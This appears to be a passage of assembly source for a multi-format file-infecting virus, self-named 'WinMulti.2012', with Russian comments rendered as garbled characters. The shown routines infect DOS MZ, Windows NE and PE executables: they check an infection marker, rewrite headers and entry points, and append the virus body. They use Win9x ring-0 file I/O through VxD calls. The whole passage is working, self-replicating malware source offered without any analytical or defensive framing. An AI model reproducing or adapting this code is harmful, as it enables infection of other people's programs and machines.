   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[*à®¢¥àï¥¬, § à ¦¥ «¨ ä ©«]

   InfectPE:   cmp [WinHeader+58h-Start32+ebp], '6666'
           je  Close


   ;[‚ëç¨á«ï¥¬ á¬¥é¥¨¥ ¯®á«¥¤¥£® í«¥¬¥â  ¢ â ¡«¨æ¥ ®¡ê¥ªâ®¢]

           xor eax, eax
           imul    ax, [WinHeader+06h-Start32+ebp], PEObjectSize
           add ax, [WinHeader+14h-Start32+ebp]
           add ax, 18h-PEObjectSize
           add eax, [WinHeaderOfs-Start32+ebp]
           mov [WinObjectOfs-Start32+ebp], eax


   ;[‘ç¨âë¢ ¥¬ ¯®á«¥¤¨© í«¥¬¥â â ¡«¨æë ®¡ê¥ªâ®¢]

           xchg    edx, eax
           mov ecx, PEObjectSize
           lea esi, [WinObject-Start32+ebp]
           call    Read
           jc  Close


   ;[‘à ¢¨¢ ¥¬ ä¨§¨ç¥áª¨© ¨ ¢¨àâã «ìë© à §¬¥àë ®¡ê¥ªâ ]

           mov eax, [WinObject+10h-Start32+ebp]
           cmp [WinObject+08h-Start32+ebp], eax
           jae Skip
           mov [WinObject+08h-Start32+ebp], eax


   ;[‘®åà ï¥¬ áâ àãî ¨ ¢ëç¨á«ï¥¬ ®¢ãî â®çªã ¢å®¤ ]

   Skip:       add eax, [WinObject+0Ch-Start32+ebp]
           add eax, large (StartPE-Start32)+(EndCode16-Start16)
           mov ecx, [WinHeader+28h-Start32+ebp]
           sub ecx, eax
           sub ecx, (RetAddress+4)-StartPE
           mov [RetAddress-Start32+ebp], ecx
           mov [WinHeader+28h-Start32+ebp], eax


   ;[Š®àà¥ªâ¨àã¥¬ à §¬¥à ä ©« ]

           add eax, EndCode32-Start32
           mov [WinHeader+50h-Start32+ebp], eax


   ;[‚ëç¨á«ï¥¬ á¬¥é¥¨¥, ¯® ª®â®à®¬ã ã¦® § ¯¨á âì ¢¨àãá]

           mov eax, [WinObject+14h-Start32+ebp]
           add eax, [WinObject+10h-Start32+ebp]


   ;[Š®àà¥ªâ¨àã¥¬ ¢¨àâã «ìë© ¨ ä¨§¨ç¥áª¨© à §¬¥àë ¯®á«¥¤¥£® ®¡ê¥ªâ ]

           add [WinObject+08h-Start32+ebp], large dword ptr CodeSize
           add [WinObject+10h-Start32+ebp], large dword ptr CodeSize


   ;[“áâ  ¢«¨¢ ¥¬ ¯à¨§ ª § à ¦¥®áâ¨]

           mov [WinHeader+58h-Start32+ebp], '6666'


   ;[‡ ¯¨áë¢ ¥¬ ª®¤ ¢¨àãá  ¢ ä ©«]

           call    WriteVirus1
           jc  Close


   ;[‡ ¯¨áë¢ ¥¬ ®¢ë© PE § £®«®¢®ª]

           mov ecx, PEHeaderSize
           mov edx, [WinHeaderOfs-Start32+ebp]
           lea esi, [WinHeader-Start32+ebp]
           call    Write
           jc  Close


   ;[‡ ¯¨áë¢ ¥¬ ®¢ë© ¯®á«¥¤¨© í«¥¬¥â â ¡«¨æë ®¡ê¥ªâ®¢]

           mov ecx, PEObjectSize
           mov edx, [WinObjectOfs-Start32+ebp]
           lea esi, [WinObject-Start32+ebp]
           call    Write
           jmp Close

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[*à®¢¥àï¥¬, á®¤¥à¦¨â «¨ ä ©« ®¢¥à«¥¨]

   InfectMZ:   call    GetFSize
           jc  Close
           call    Calc
           cmp [DosHeader+02h-Start32+ebp], eax
           jne Close


   ;[‚ëç¨á«ï¥¬ ¤«¨ã ä ©«  á ¢¨àãá®¬]

           call    GetFSize
           jc  Close
           add eax, large CodeSize
           call    Calc
           mov [DosHeader+02h-Start32+ebp], eax


   ;[‘®åà ï¥¬ SS, SP, CS ¨ IP]

           mov ax, [DosHeader+0Eh-Start32+ebp]
           mov [OldSS-EndCode16+1+ebp], ax
           mov ax, [DosHeader+10h-Start32+ebp]
           mov [OldSP-EndCode16+1+ebp], ax
           mov eax, [DosHeader+14h-Start32+ebp]
           mov [OldCSIP-EndCode16+ebp], eax


   ;[‚ëç¨á«ï¥¬ ®¢ãî â®çªã ¢å®¤ ]

           call    GetFSize
           jc  Close
           xor edx, edx
           mov ecx, 16
           div ecx
           sub ax, [DosHeader+08h-Start32+ebp]
           add dx, StartMZ-Start16


   ;[Š®àà¥ªâ¨àã¥¬ â®çªã ¢å®¤  ¨  ¤à¥á áâ¥ª ]

           mov [DosHeader+16h-Start32+ebp], ax
           mov [DosHeader+14h-Start32+ebp], dx
           mov [DosHeader+0Eh-Start32+ebp], ax
           mov [DosHeader+10h-Start32+ebp], word ptr CodeSize+100h


   ;[“áâ  ¢«¨¢ ¥¬ ¯à¨§ ª § à ¦¥®áâ¨]

           mov [DosHeader+12h-Start32+ebp], word ptr 6666h


   ;[‡ ¯¨áë¢ ¥¬ ¢¨àãá ¢ ä ©«]

           call    GetFSize
           jc  Close
           call    WriteVirus1
           jc  Close


   ;[‡ ¯¨áë¢ ¥¬ ®¢ë© MZ § £®«®¢®ª]

           mov ecx, DosHeaderSize
           xor edx, edx
           lea esi, [DosHeader-Start32+ebp]
           call    Write
           jmp Close

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[*à®¢¥àï¥¬, § à ¦¥ «¨ ä ©«]

   InfectNE:   cmp [WinHeader+08h-Start32+ebp], '6666'
           je  Close


   ;[*à®¢¥àï¥¬ ®¯¥à æ¨®ãî á¨áâ¥¬ã, ¤«ï ª®â®à®© ¯à¥¤ § ç¥ ä ©«]

           test    [WinHeader+36h-Start32+ebp], byte ptr 00000010b
           jz  Close


   ;[‘®åà ï¥¬ áâ àâ®¢ë©  ¤à¥á]

           mov eax, [WinHeader+14h-Start32+ebp]
           ror eax, 16
           mov [ReloCSIP-EndCode16+ebp], 0FFFF0000h


   ;[* áâà ¨¢ ¥¬ Relocation Table]

           mov [RelocTable+00h-Start32+ebp], 04030001h
           mov [RelocTable+04h-Start32+ebp], word ptr (ReloCSIP-Start16)
           mov [RelocTable+06h-Start32+ebp], eax


   ;[“¢¥«¨ç¨¢ ¥¬ á¬¥é¥¨¥ ¢á¥å â ¡«¨æ   ®¤¨ í«¥¬¥â]

           mov ax, NEObjectSize
           add [WinHeader+04h-Start32+ebp], ax
           add [WinHeader+24h-Start32+ebp], ax
           add [WinHeader+26h-Start32+ebp], ax
           add [WinHeader+28h-Start32+ebp], ax
           add [WinHeader+2Ah-Start32+ebp], ax
           sub [WinHeaderOfs-Start32+ebp], ax


   ;[“¢¥«¨ç¨¢ ¥¬ ª®«¨ç¥áâ¢® á¥£¬¥â®¢ ¨ ¢ëç¨á«ï¥¬ ®¢ë© áâ àâ®¢ë©  ¤à¥á]

           mov ax, [WinHeader+1Ch-Start32+ebp]
           inc ax
           mov [WinHeader+1Ch-Start32+ebp], ax
           mov [WinHeader+16h-Start32+ebp], ax
           mov [WinHeader+14h-Start32+ebp], word ptr (StartNE-Start16)


   ;[“áâ  ¢«¨¢ ¥¬ ¯à¨§ ª § à ¦¥®áâ¨]

           mov [WinHeader+08h-Start32+ebp], '6666'


   ;[‡ ¯¨áë¢ ¥¬ ®¢ë© ãª § â¥«ì   NE-EXE § £®«®¢®ª]

           mov ecx, 4
           mov edx, 3Ch
           lea esi, [WinHeaderOfs-Start32+ebp]
           call    Write
           jc  Close


   ;[‡ ¯¨áë¢ ¥¬ ®¢ë© NE-EXE § £®«®¢®ª]

           mov ecx, NEHeaderSize
           mov edx, [WinHeaderOfs-Start32+ebp]
           lea esi, [WinHeader-Start32+ebp]
           call    Write
           jc  Close


   ;[‚ëç¨á«ï¥¬ à á¯®«®¦¥¨¥ â ¡«¨æë á¥£¬¥â®¢]

           movzx   edx, word ptr [WinHeader+22h-Start32+ebp]
           mov eax, [WinHeaderOfs-Start32+ebp]
           add edx, eax


   ;[‘¤¢¨£ ¥¬ â ¡«¨æã á¥£¬¥â®¢  § ¤   ®¤¨ ¤¥áªà¨¯â®à]

           mov ecx, NEObjectSize
           lea esi, [WinObject-Start32+ebp]
   Shift:      add edx, ecx
           call    Read
           jc  Close
           sub edx, ecx
           call    Write
           jc  Close
           add edx, ecx
           dec word ptr [WinHeader+1Ch-Start32+ebp]
           cmp word ptr [WinHeader+1Ch-Start32+ebp], 1
           jne Shift
           mov [WinObjectOfs-Start32+ebp], edx


   ;[‚ëç¨á«ï¥¬ á¬¥é¥¨¥ ¢¨àãá  ¢ ä ©«¥ ¢ ¡«®ª å]

           call    GetFSize
           jc  Close
           mov cl, [WinHeader+32h-Start32+ebp]
           shr eax, cl
           inc eax


   ;[‘®§¤ ¥¬ ¤¥áªà¨¯â®à ¢¨àãá®£® á¥£¬¥â ]

           mov [WinObject+00h-Start32+ebp], ax
           mov [WinObject+02h-Start32+ebp], word ptr CodeSize
           mov [WinObject+04h-Start32+ebp], word ptr 0180h
           mov [WinObject+06h-Start32+ebp], word ptr CodeSize


   ;[‡ ¯¨áë¢ ¥¬ ¢¨àãá ¢ ª®¥æ ä ©« ]

           shl eax, cl
           mov ecx, CodeSize+RelocTableSize
           call    WriteVirus2
           jc  Close


   ;[‡ ¯¨áë¢ ¥¬ á¥£¬¥â ¢¨àãá  ¢ â ¡«¨æã á¥£¬¥â®¢]

           mov ecx, NEObjectSize
           mov edx, [WinObjectOfs-Start32+ebp]
           lea esi, [WinObject-Start32+ebp]
           call    Write
           jmp Close

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ





















   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                             *Ž„**Žƒ*€ŒŒ›
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Calc:       mov ecx, 512
           xor edx, edx
           div ecx
           or  edx, edx
           jz  $+3
           inc eax
           shl eax, 16
           add eax, edx
           ret


   WriteVirus1:    mov ecx, CodeSize
   WriteVirus2:    xchg    edx, eax
           lea esi, [Start16-EndCode16+ebp]
   Write:      mov eax, 0D601h     ; R0_WriteFile
           jmp FileIO
   Read:       mov eax, 0D600h     ; R0_ReadFile
           jmp FileIO
   GetFSize:   mov eax, 0D800h     ; R0_GetFileSize
   FileIO:     push    00400032h       ; IFSmgr_Ring0_FileIO
           call    VxDcall
           ret


   VxDcall:    mov [Int20h-Start32+ebp], word ptr 20CDh
           pop dword ptr [RetAddr-Start32+ebp]
           pop dword ptr [VxDfunc-Start32+ebp]
   Int20h      dw  0
   VxDfunc     dd  0
           db  68h
   RetAddr     dd  0
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ





















   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                                 „€**›…
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   VirName     db  'WinMulti.2012 -- Copyright (c) by DJ Sadovnikov'

   EndCode32   =   $
   CodeSize    =   (EndCode32-Start32)+(EndCode16-Start16)

   RelocTableSize  =   0Ah
   DosHeaderSize   =   18h
   WinHeaderSize   =   5Ch     ; MAX(PEHeaderSize,NEHeaderSize)
   WinObjectSize   =   28h     ; MAX(PEObjectSize,NEObjectSize)
   PEHeaderSize    =   5Ch
   NEHeaderSize    =   40h
   PEObjectSize    =   28h
   NEObjectSize    =   08h

   RelocTable  db  RelocTableSize dup (?)  ; Don't move this anywhere
   DosHeader   db  DosHeaderSize dup (?)
   WinHeader   db  WinHeaderSize dup (?)
   WinObject   db  WinObjectSize dup (?)
   FileName    db  256 dup (?)
   WinHeaderOfs    dd  ?
   WinObjectOfs    dd  ?
   Busy        db  ?

   MemSize     =   (($-Start32)+(EndCode16-Start16))/4096+1

   Code32      ends
           end StartMZ
